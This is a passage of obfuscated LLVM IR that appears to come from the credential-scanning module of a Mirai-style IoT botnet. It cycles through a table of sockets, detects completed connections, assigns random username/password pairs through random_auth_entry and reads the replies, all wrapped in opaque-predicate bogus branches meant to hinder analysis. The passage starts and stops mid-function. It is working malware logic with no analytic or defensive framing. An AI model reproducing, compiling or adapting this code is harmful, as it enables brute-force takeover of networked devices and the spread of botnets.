; <label>:721:                                    ; preds = %707
  %722 = load i32, i32* @fake_time, align 4
  %723 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %724 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %723, i32 0, i32 2
  %725 = load i32, i32* %724, align 4
  %726 = sub i32 %722, %725
  %727 = load i32, i32* %28, align 4
  %728 = icmp ugt i32 %726, %727
  br i1 %728, label %729, label %777

; <label>:729:                                    ; preds = %721
  %730 = load i32, i32* @x.53
  %731 = load i32, i32* @y.54
  %732 = sub i32 %730, 1
  %733 = mul i32 %730, %732
  %734 = urem i32 %733, 2
  %735 = icmp eq i32 %734, 0
  %736 = icmp slt i32 %731, 10
  %737 = or i1 %735, %736
  br i1 %737, label %originalBB93, label %originalBB93alteredBB

originalBB93:                                     ; preds = %originalBB93alteredBB, %729
  %738 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %739 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %738, i32 0, i32 1
  %740 = load i32, i32* %739, align 8
  %741 = call i32 @close(i32 %740)
  %742 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %743 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %742, i32 0, i32 1
  store i32 -1, i32* %743, align 8
  %744 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %745 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %744, i32 0, i32 3
  %746 = load i32, i32* %745, align 8
  %747 = icmp ugt i32 %746, 2
  %748 = load i32, i32* @x.53
  %749 = load i32, i32* @y.54
  %750 = sub i32 %748, 1
  %751 = mul i32 %748, %750
  %752 = urem i32 %751, 2
  %753 = icmp eq i32 %752, 0
  %754 = icmp slt i32 %749, 10
  %755 = or i1 %753, %754
  br i1 %755, label %originalBBpart295, label %originalBB93alteredBB

originalBBpart295:                                ; preds = %originalBB93
  br i1 %747, label %756, label %771

; <label>:756:                                    ; preds = %originalBBpart295
  %757 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %758 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %757, i32 0, i32 8
  %759 = load i8, i8* %758, align 8
  %760 = add i8 %759, 1
  store i8 %760, i8* %758, align 8
  %761 = zext i8 %760 to i32
  %762 = icmp eq i32 %761, 10
  br i1 %762, label %763, label %768

; <label>:763:                                    ; preds = %756
  %764 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %765 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %764, i32 0, i32 8
  store i8 0, i8* %765, align 8
  %766 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %767 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %766, i32 0, i32 3
  store i32 0, i32* %767, align 8
  br label %770

; <label>:768:                                    ; preds = %756
  %769 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* %769)
  br label %770

; <label>:770:                                    ; preds = %768, %763
  br label %776

; <label>:771:                                    ; preds = %originalBBpart295
  %772 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %773 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %772, i32 0, i32 8
  store i8 0, i8* %773, align 8
  %774 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %775 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %774, i32 0, i32 3
  store i32 0, i32* %775, align 8
  br label %776

; <label>:776:                                    ; preds = %771, %770
  br label %937

; <label>:777:                                    ; preds = %721, %707
  %778 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %779 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %778, i32 0, i32 3
  %780 = load i32, i32* %779, align 8
  %781 = icmp eq i32 %780, 1
  br i1 %781, label %782, label %840

; <label>:782:                                    ; preds = %777
  %783 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %784 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %783, i32 0, i32 1
  %785 = load i32, i32* %784, align 8
  %786 = srem i32 %785, 64
  %787 = zext i32 %786 to i64
  %788 = shl i64 1, %787
  %789 = getelementptr inbounds %struct.fd_set.18, %struct.fd_set.18* %6, i32 0, i32 0
  %790 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %791 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %790, i32 0, i32 1
  %792 = load i32, i32* %791, align 8
  %793 = sdiv i32 %792, 64
  %794 = sext i32 %793 to i64
  %795 = getelementptr inbounds [16 x i64], [16 x i64]* %789, i64 0, i64 %794
  %796 = load i64, i64* %795, align 8
  %797 = or i64 %796, %788
  store i64 %797, i64* %795, align 8
  %798 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %799 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %798, i32 0, i32 1
  %800 = load i32, i32* %799, align 8
  %801 = load i32, i32* %12, align 4
  %802 = icmp sgt i32 %800, %801
  br i1 %802, label %803, label %823

; <label>:803:                                    ; preds = %782
  %804 = load i32, i32* @x.53
  %805 = load i32, i32* @y.54
  %806 = sub i32 %804, 1
  %807 = mul i32 %804, %806
  %808 = urem i32 %807, 2
  %809 = icmp eq i32 %808, 0
  %810 = icmp slt i32 %805, 10
  %811 = or i1 %809, %810
  br i1 %811, label %originalBB97, label %originalBB97alteredBB

originalBB97:                                     ; preds = %originalBB97alteredBB, %803
  %812 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %813 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %812, i32 0, i32 1
  %814 = load i32, i32* %813, align 8
  store i32 %814, i32* %12, align 4
  %815 = load i32, i32* @x.53
  %816 = load i32, i32* @y.54
  %817 = sub i32 %815, 1
  %818 = mul i32 %815, %817
  %819 = urem i32 %818, 2
  %820 = icmp eq i32 %819, 0
  %821 = icmp slt i32 %816, 10
  %822 = or i1 %820, %821
  br i1 %822, label %originalBBpart299, label %originalBB97alteredBB

originalBBpart299:                                ; preds = %originalBB97
  br label %823

; <label>:823:                                    ; preds = %originalBBpart299, %782
  %824 = load i32, i32* @x.53
  %825 = load i32, i32* @y.54
  %826 = sub i32 %824, 1
  %827 = mul i32 %824, %826
  %828 = urem i32 %827, 2
  %829 = icmp eq i32 %828, 0
  %830 = icmp slt i32 %825, 10
  %831 = or i1 %829, %830
  br i1 %831, label %originalBB101, label %originalBB101alteredBB

originalBB101:                                    ; preds = %originalBB101alteredBB, %823
  %832 = load i32, i32* @x.53
  %833 = load i32, i32* @y.54
  %834 = sub i32 %832, 1
  %835 = mul i32 %832, %834
  %836 = urem i32 %835, 2
  %837 = icmp eq i32 %836, 0
  %838 = icmp slt i32 %833, 10
  %839 = or i1 %837, %838
  br i1 %839, label %originalBBpart2103, label %originalBB101alteredBB

originalBBpart2103:                               ; preds = %originalBB101
  br label %920

; <label>:840:                                    ; preds = %777
  %841 = load i32, i32* @x.53
  %842 = load i32, i32* @y.54
  %843 = sub i32 %841, 1
  %844 = mul i32 %841, %843
  %845 = urem i32 %844, 2
  %846 = icmp eq i32 %845, 0
  %847 = icmp slt i32 %842, 10
  %848 = or i1 %846, %847
  br i1 %848, label %originalBB105, label %originalBB105alteredBB

originalBB105:                                    ; preds = %originalBB105alteredBB, %840
  %849 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %850 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %849, i32 0, i32 3
  %851 = load i32, i32* %850, align 8
  %852 = icmp ne i32 %851, 0
  %853 = load i32, i32* @x.53
  %854 = load i32, i32* @y.54
  %855 = sub i32 %853, 1
  %856 = mul i32 %853, %855
  %857 = urem i32 %856, 2
  %858 = icmp eq i32 %857, 0
  %859 = icmp slt i32 %854, 10
  %860 = or i1 %858, %859
  br i1 %860, label %originalBBpart2107, label %originalBB105alteredBB

originalBBpart2107:                               ; preds = %originalBB105
  br i1 %852, label %861, label %903

; <label>:861:                                    ; preds = %originalBBpart2107
  %862 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %863 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %862, i32 0, i32 1
  %864 = load i32, i32* %863, align 8
  %865 = srem i32 %864, 64
  %866 = zext i32 %865 to i64
  %867 = shl i64 1, %866
  %868 = getelementptr inbounds %struct.fd_set.18, %struct.fd_set.18* %5, i32 0, i32 0
  %869 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %870 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %869, i32 0, i32 1
  %871 = load i32, i32* %870, align 8
  %872 = sdiv i32 %871, 64
  %873 = sext i32 %872 to i64
  %874 = getelementptr inbounds [16 x i64], [16 x i64]* %868, i64 0, i64 %873
  %875 = load i64, i64* %874, align 8
  %876 = or i64 %875, %867
  store i64 %876, i64* %874, align 8
  %877 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %878 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %877, i32 0, i32 1
  %879 = load i32, i32* %878, align 8
  %880 = load i32, i32* %11, align 4
  %881 = icmp sgt i32 %879, %880
  br i1 %881, label %882, label %902

; <label>:882:                                    ; preds = %861
  %883 = load i32, i32* @x.53
  %884 = load i32, i32* @y.54
  %885 = sub i32 %883, 1
  %886 = mul i32 %883, %885
  %887 = urem i32 %886, 2
  %888 = icmp eq i32 %887, 0
  %889 = icmp slt i32 %884, 10
  %890 = or i1 %888, %889
  br i1 %890, label %originalBB109, label %originalBB109alteredBB

originalBB109:                                    ; preds = %originalBB109alteredBB, %882
  %891 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %892 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %891, i32 0, i32 1
  %893 = load i32, i32* %892, align 8
  store i32 %893, i32* %11, align 4
  %894 = load i32, i32* @x.53
  %895 = load i32, i32* @y.54
  %896 = sub i32 %894, 1
  %897 = mul i32 %894, %896
  %898 = urem i32 %897, 2
  %899 = icmp eq i32 %898, 0
  %900 = icmp slt i32 %895, 10
  %901 = or i1 %899, %900
  br i1 %901, label %originalBBpart2111, label %originalBB109alteredBB

originalBBpart2111:                               ; preds = %originalBB109
  br label %902

; <label>:902:                                    ; preds = %originalBBpart2111, %861
  br label %903

; <label>:903:                                    ; preds = %902, %originalBBpart2107
  %904 = load i32, i32* @x.53
  %905 = load i32, i32* @y.54
  %906 = sub i32 %904, 1
  %907 = mul i32 %904, %906
  %908 = urem i32 %907, 2
  %909 = icmp eq i32 %908, 0
  %910 = icmp slt i32 %905, 10
  %911 = or i1 %909, %910
  br i1 %911, label %originalBB113, label %originalBB113alteredBB

originalBB113:                                    ; preds = %originalBB113alteredBB, %903
  %912 = load i32, i32* @x.53
  %913 = load i32, i32* @y.54
  %914 = sub i32 %912, 1
  %915 = mul i32 %912, %914
  %916 = urem i32 %915, 2
  %917 = icmp eq i32 %916, 0
  %918 = icmp slt i32 %913, 10
  %919 = or i1 %917, %918
  br i1 %919, label %originalBBpart2115, label %originalBB113alteredBB

originalBBpart2115:                               ; preds = %originalBB113
  br label %920

; <label>:920:                                    ; preds = %originalBBpart2115, %originalBBpart2103
  %921 = load i32, i32* @x.53
  %922 = load i32, i32* @y.54
  %923 = sub i32 %921, 1
  %924 = mul i32 %921, %923
  %925 = urem i32 %924, 2
  %926 = icmp eq i32 %925, 0
  %927 = icmp slt i32 %922, 10
  %928 = or i1 %926, %927
  br i1 %928, label %originalBB117, label %originalBB117alteredBB

originalBB117:                                    ; preds = %originalBB117alteredBB, %920
  %929 = load i32, i32* @x.53
  %930 = load i32, i32* @y.54
  %931 = sub i32 %929, 1
  %932 = mul i32 %929, %931
  %933 = urem i32 %932, 2
  %934 = icmp eq i32 %933, 0
  %935 = icmp slt i32 %930, 10
  %936 = or i1 %934, %935
  br i1 %936, label %originalBBpart2119, label %originalBB117alteredBB

originalBBpart2119:                               ; preds = %originalBB117
  br label %937

; <label>:937:                                    ; preds = %originalBBpart2119, %776
  %938 = load i32, i32* %1, align 4
  %939 = add nsw i32 %938, 1
  store i32 %939, i32* %1, align 4
  br label %704

; <label>:940:                                    ; preds = %704
  %941 = getelementptr inbounds %struct.timeval.19, %struct.timeval.19* %8, i32 0, i32 1
  store i64 0, i64* %941, align 8
  %942 = getelementptr inbounds %struct.timeval.19, %struct.timeval.19* %8, i32 0, i32 0
  store i64 1, i64* %942, align 8
  %943 = load i32, i32* %12, align 4
  %944 = load i32, i32* %11, align 4
  %945 = icmp sgt i32 %943, %944
  br i1 %945, label %946, label %948

; <label>:946:                                    ; preds = %940
  %947 = load i32, i32* %12, align 4
  br label %950

; <label>:948:                                    ; preds = %940
  %949 = load i32, i32* %11, align 4
  br label %950

; <label>:950:                                    ; preds = %948, %946
  %951 = phi i32 [ %947, %946 ], [ %949, %948 ]
  %952 = load i32, i32* @x.53
  %953 = load i32, i32* @y.54
  %954 = sub i32 %952, 1
  %955 = mul i32 %952, %954
  %956 = urem i32 %955, 2
  %957 = icmp eq i32 %956, 0
  %958 = icmp slt i32 %953, 10
  %959 = or i1 %957, %958
  br i1 %959, label %originalBB121, label %originalBB121alteredBB

originalBB121:                                    ; preds = %originalBB121alteredBB, %950
  %960 = add nsw i32 1, %951
  %961 = call i32 @select(i32 %960, %struct.fd_set.18* %5, %struct.fd_set.18* %6, %struct.fd_set.18* null, %struct.timeval.19* %8)
  store i32 %961, i32* %13, align 4
  %962 = call i64 @time(i64* null) #6
  %963 = trunc i64 %962 to i32
  store i32 %963, i32* @fake_time, align 4
  store i32 0, i32* %1, align 4
  %964 = load i32, i32* @x.53
  %965 = load i32, i32* @y.54
  %966 = sub i32 %964, 1
  %967 = mul i32 %964, %966
  %968 = urem i32 %967, 2
  %969 = icmp eq i32 %968, 0
  %970 = icmp slt i32 %965, 10
  %971 = or i1 %969, %970
  br i1 %971, label %originalBBpart2130, label %originalBB121alteredBB

originalBBpart2130:                               ; preds = %originalBB121
  br label %972

; <label>:972:                                    ; preds = %1695, %originalBBpart2130
  %973 = load i32, i32* %1, align 4
  %974 = icmp slt i32 %973, 256
  br i1 %974, label %975, label %1698

; <label>:975:                                    ; preds = %972
  %976 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %977 = load i32, i32* %1, align 4
  %978 = sext i32 %977 to i64
  %979 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %976, i64 %978
  store %struct.scanner_connection* %979, %struct.scanner_connection** %7, align 8
  %980 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %981 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %980, i32 0, i32 1
  %982 = load i32, i32* %981, align 8
  %983 = icmp eq i32 %982, -1
  br i1 %983, label %984, label %985

; <label>:984:                                    ; preds = %975
  br label %1695

; <label>:985:                                    ; preds = %975
  %986 = load i32, i32* @x.53
  %987 = load i32, i32* @y.54
  %988 = sub i32 %986, 1
  %989 = mul i32 %986, %988
  %990 = urem i32 %989, 2
  %991 = icmp eq i32 %990, 0
  %992 = icmp slt i32 %987, 10
  %993 = or i1 %991, %992
  br i1 %993, label %originalBB132, label %originalBB132alteredBB

originalBB132:                                    ; preds = %originalBB132alteredBB, %985
  %994 = getelementptr inbounds %struct.fd_set.18, %struct.fd_set.18* %6, i32 0, i32 0
  %995 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %996 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %995, i32 0, i32 1
  %997 = load i32, i32* %996, align 8
  %998 = sdiv i32 %997, 64
  %999 = sext i32 %998 to i64
  %1000 = getelementptr inbounds [16 x i64], [16 x i64]* %994, i64 0, i64 %999
  %1001 = load i64, i64* %1000, align 8
  %1002 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1003 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1002, i32 0, i32 1
  %1004 = load i32, i32* %1003, align 8
  %1005 = srem i32 %1004, 64
  %1006 = zext i32 %1005 to i64
  %1007 = shl i64 1, %1006
  %1008 = and i64 %1001, %1007
  %1009 = icmp ne i64 %1008, 0
  %1010 = load i32, i32* @x.53
  %1011 = load i32, i32* @y.54
  %1012 = sub i32 %1010, 1
  %1013 = mul i32 %1010, %1012
  %1014 = urem i32 %1013, 2
  %1015 = icmp eq i32 %1014, 0
  %1016 = icmp slt i32 %1011, 10
  %1017 = or i1 %1015, %1016
  br i1 %1017, label %originalBBpart2160, label %originalBB132alteredBB

originalBBpart2160:                               ; preds = %originalBB132
  br i1 %1009, label %1018, label %1081

; <label>:1018:                                   ; preds = %originalBBpart2160
  store i32 0, i32* %29, align 4
  store i32 0, i32* %30, align 4
  store i32 4, i32* %31, align 4
  %1019 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1020 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1019, i32 0, i32 1
  %1021 = load i32, i32* %1020, align 8
  %1022 = bitcast i32* %29 to i8*
  %1023 = call i32 @getsockopt(i32 %1021, i32 1, i32 4, i8* %1022, i32* %31) #6
  store i32 %1023, i32* %30, align 4
  %1024 = load i32, i32* %29, align 4
  %1025 = icmp eq i32 %1024, 0
  br i1 %1025, label %1026, label %1053

; <label>:1026:                                   ; preds = %1018
  %1027 = load i32, i32* @x.53
  %1028 = load i32, i32* @y.54
  %1029 = sub i32 %1027, 1
  %1030 = mul i32 %1027, %1029
  %1031 = urem i32 %1030, 2
  %1032 = icmp eq i32 %1031, 0
  %1033 = icmp slt i32 %1028, 10
  %1034 = or i1 %1032, %1033
  br i1 %1034, label %originalBB162, label %originalBB162alteredBB

originalBB162:                                    ; preds = %originalBB162alteredBB, %1026
  %1035 = load i32, i32* %30, align 4
  %1036 = icmp eq i32 %1035, 0
  %1037 = load i32, i32* @x.53
  %1038 = load i32, i32* @y.54
  %1039 = sub i32 %1037, 1
  %1040 = mul i32 %1037, %1039
  %1041 = urem i32 %1040, 2
  %1042 = icmp eq i32 %1041, 0
  %1043 = icmp slt i32 %1038, 10
  %1044 = or i1 %1042, %1043
  br i1 %1044, label %originalBBpart2164, label %originalBB162alteredBB

originalBBpart2164:                               ; preds = %originalBB162
  br i1 %1036, label %1045, label %1053

; <label>:1045:                                   ; preds = %originalBBpart2164
  %1046 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1047 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1046, i32 0, i32 3
  store i32 2, i32* %1047, align 8
  %1048 = call %struct.scanner_auth* @random_auth_entry()
  %1049 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1050 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1049, i32 0, i32 0
  store %struct.scanner_auth* %1048, %struct.scanner_auth** %1050, align 8
  %1051 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1052 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1051, i32 0, i32 6
  store i32 0, i32* %1052, align 4
  br label %1064

; <label>:1053:                                   ; preds = %originalBBpart2164, %1018
  %1054 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1055 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1054, i32 0, i32 1
  %1056 = load i32, i32* %1055, align 8
  %1057 = call i32 @close(i32 %1056)
  %1058 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1059 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1058, i32 0, i32 1
  store i32 -1, i32* %1059, align 8
  %1060 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1061 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1060, i32 0, i32 8
  store i8 0, i8* %1061, align 8
  %1062 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1063 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1062, i32 0, i32 3
  store i32 0, i32* %1063, align 8
  br label %1695

; <label>:1064:                                   ; preds = %1045
  %1065 = load i32, i32* @x.53
  %1066 = load i32, i32* @y.54
  %1067 = sub i32 %1065, 1
  %1068 = mul i32 %1065, %1067
  %1069 = urem i32 %1068, 2
  %1070 = icmp eq i32 %1069, 0
  %1071 = icmp slt i32 %1066, 10
  %1072 = or i1 %1070, %1071
  br i1 %1072, label %originalBB166, label %originalBB166alteredBB

originalBB166:                                    ; preds = %originalBB166alteredBB, %1064
  %1073 = load i32, i32* @x.53
  %1074 = load i32, i32* @y.54
  %1075 = sub i32 %1073, 1
  %1076 = mul i32 %1073, %1075
  %1077 = urem i32 %1076, 2
  %1078 = icmp eq i32 %1077, 0
  %1079 = icmp slt i32 %1074, 10
  %1080 = or i1 %1078, %1079
  br i1 %1080, label %originalBBpart2168, label %originalBB166alteredBB

originalBBpart2168:                               ; preds = %originalBB166
  br label %1081

; <label>:1081:                                   ; preds = %originalBBpart2168, %originalBBpart2160
  %1082 = getelementptr inbounds %struct.fd_set.18, %struct.fd_set.18* %5, i32 0, i32 0
  %1083 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1084 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1083, i32 0, i32 1
  %1085 = load i32, i32* %1084, align 8
  %1086 = sdiv i32 %1085, 64
  %1087 = sext i32 %1086 to i64
  %1088 = getelementptr inbounds [16 x i64], [16 x i64]* %1082, i64 0, i64 %1087
  %1089 = load i64, i64* %1088, align 8
  %1090 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1091 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1090, i32 0, i32 1
  %1092 = load i32, i32* %1091, align 8
  %1093 = srem i32 %1092, 64
  %1094 = zext i32 %1093 to i64
  %1095 = shl i64 1, %1094
  %1096 = and i64 %1089, %1095
  %1097 = icmp ne i64 %1096, 0
  br i1 %1097, label %1098, label %1694

; <label>:1098:                                   ; preds = %1081
  br label %1099

; <label>:1099:                                   ; preds = %1692, %1098
  %1100 = load i32, i32* @x.53
  %1101 = load i32, i32* @y.54
  %1102 = sub i32 %1100, 1
  %1103 = mul i32 %1100, %1102
  %1104 = urem i32 %1103, 2
  %1105 = icmp eq i32 %1104, 0
  %1106 = icmp slt i32 %1101, 10
  %1107 = or i1 %1105, %1106
  br i1 %1107, label %originalBB170, label %originalBB170alteredBB

originalBB170:                                    ; preds = %originalBB170alteredBB, %1099
  %1108 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1109 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1108, i32 0, i32 3
  %1110 = load i32, i32* %1109, align 8
  %1111 = icmp eq i32 %1110, 0
  %1112 = load i32, i32* @x.53
  %1113 = load i32, i32* @y.54
  %1114 = sub i32 %1112, 1
  %1115 = mul i32 %1112, %1114
  %1116 = urem i32 %1115, 2
  %1117 = icmp eq i32 %1116, 0
  %1118 = icmp slt i32 %1113, 10
  %1119 = or i1 %1117, %1118
  br i1 %1119, label %originalBBpart2172, label %originalBB170alteredBB

originalBBpart2172:                               ; preds = %originalBB170
  br i1 %1111, label %1120, label %1121

; <label>:1120:                                   ; preds = %originalBBpart2172
  br label %1693

; <label>:1121:                                   ; preds = %originalBBpart2172
  %1122 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1123 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1122, i32 0, i32 6
  %1124 = load i32, i32* %1123, align 4
  %1125 = icmp eq i32 %1124, 256
  br i1 %1125, label %1126, label %1138

; <label>:1126:                                   ; preds = %1121
  %1127 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1128 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1127, i32 0, i32 7
  %1129 = getelementptr inbounds [256 x i8], [256 x i8]* %1128, i32 0, i32 0
  %1130 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1131 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1130, i32 0, i32 7
  %1132 = getelementptr inbounds [256 x i8], [256 x i8]* %1131, i32 0, i32 0
  %1133 = getelementptr inbounds i8, i8* %1132, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1129, i8* %1133, i64 192, i32 1, i1 false)
  %1134 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1135 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1134, i32 0, i32 6
  %1136 = load i32, i32* %1135, align 4
  %1137 = sub nsw i32 %1136, 64
  store i32 %1137, i32* %1135, align 4
  br label %1138

; <label>:1138:                                   ; preds = %1126, %1121
  %1139 = call i32* @__errno_location() #7
  store i32 0, i32* %1139, align 4
  %1140 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1141 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1140, i32 0, i32 1
  %1142 = load i32, i32* %1141, align 8
  %1143 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1144 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1143, i32 0, i32 7
  %1145 = getelementptr inbounds [256 x i8], [256 x i8]* %1144, i32 0, i32 0
  %1146 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1147 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1146, i32 0, i32 6
  %1148 = load i32, i32* %1147, align 4
  %1149 = sext i32 %1148 to i64
  %1150 = getelementptr inbounds i8, i8* %1145, i64 %1149
  %1151 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1152 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1151, i32 0, i32 6
  %1153 = load i32, i32* %1152, align 4
  %1154 = sub nsw i32 256, %1153
  %1155 = call i32 @recv_strip_null(i32 %1142, i8* %1150, i32 %1154, i32 16384)
  store i32 %1155, i32* %32, align 4
  %1156 = load i32, i32* %32, align 4
  %1157 = icmp eq i32 %1156, 0
  br i1 %1157, label %1158, label %1160

; <label>:1158:                                   ; preds = %1138
  %1159 = call i32* @__errno_location() #7
  store i32 104, i32* %1159, align 4
  store i32 -1, i32* %32, align 4
  br label %1160

; <label>:1160:                                   ; preds = %1158, %1138
  %1161 = load i32, i32* %32, align 4
  %1162 = icmp eq i32 %1161, -1
  br i1 %1162, label %1163, label %1241

; <label>:1163:                                   ; preds = %1160
  %1164 = call i32* @__errno_location() #7
  %1165 = load i32, i32* %1164, align 4
  %1166 = icmp ne i32 %1165, 11
  br i1 %1166, label %1167, label %1240

; <label>:1167:                                   ; preds = %1163
  %1168 = load i32, i32* @x.53
  %1169 = load i32, i32* @y.54
  %1170 = sub i32 %1168, 1
  %1171 = mul i32 %1168, %1170
  %1172 = urem i32 %1171, 2
  %1173 = icmp eq i32 %1172, 0
  %1174 = icmp slt i32 %1169, 10
  %1175 = or i1 %1173, %1174
  br i1 %1175, label %originalBB174, label %originalBB174alteredBB

originalBB174:                                    ; preds = %originalBB174alteredBB, %1167
  %1176 = call i32* @__errno_location() #7
  %1177 = load i32, i32* %1176, align 4
  %1178 = icmp ne i32 %1177, 11
  %1179 = load i32, i32* @x.53
  %1180 = load i32, i32* @y.54
  %1181 = sub i32 %1179, 1
  %1182 = mul i32 %1179, %1181
  %1183 = urem i32 %1182, 2
  %1184 = icmp eq i32 %1183, 0
  %1185 = icmp slt i32 %1180, 10
  %1186 = or i1 %1184, %1185
  br i1 %1186, label %originalBBpart2176, label %originalBB174alteredBB

originalBBpart2176:                               ; preds = %originalBB174
  br i1 %1178, label %1187, label %1240

; <label>:1187:                                   ; preds = %originalBBpart2176
  %1188 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1189 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1188, i32 0, i32 1
  %1190 = load i32, i32* %1189, align 8
  %1191 = call i32 @close(i32 %1190)
  %1192 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1193 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1192, i32 0, i32 1
  store i32 -1, i32* %1193, align 8
  %1194 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1195 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1194, i32 0, i32 8
  %1196 = load i8, i8* %1195, align 8
  %1197 = add i8 %1196, 1
  store i8 %1197, i8* %1195, align 8
  %1198 = zext i8 %1197 to i32
  %1199 = icmp sge i32 %1198, 10
  br i1 %1199, label %1200, label %1221

; <label>:1200:                                   ; preds = %1187
  %1201 = load i32, i32* @x.53
  %1202 = load i32, i32* @y.54
  %1203 = sub i32 %1201, 1
  %1204 = mul i32 %1201, %1203
  %1205 = urem i32 %1204, 2
  %1206 = icmp eq i32 %1205, 0
  %1207 = icmp slt i32 %1202, 10
  %1208 = or i1 %1206, %1207
  br i1 %1208, label %originalBB178, label %originalBB178alteredBB

originalBB178:                                    ; preds = %originalBB178alteredBB, %1200
  %1209 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1210 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1209, i32 0, i32 8
  store i8 0, i8* %1210, align 8
  %1211 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1212 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1211, i32 0, i32 3
  store i32 0, i32* %1212, align 8
  %1213 = load i32, i32* @x.53
  %1214 = load i32, i32* @y.54
  %1215 = sub i32 %1213, 1
  %1216 = mul i32 %1213, %1215
  %1217 = urem i32 %1216, 2
  %1218 = icmp eq i32 %1217, 0
  %1219 = icmp slt i32 %1214, 10
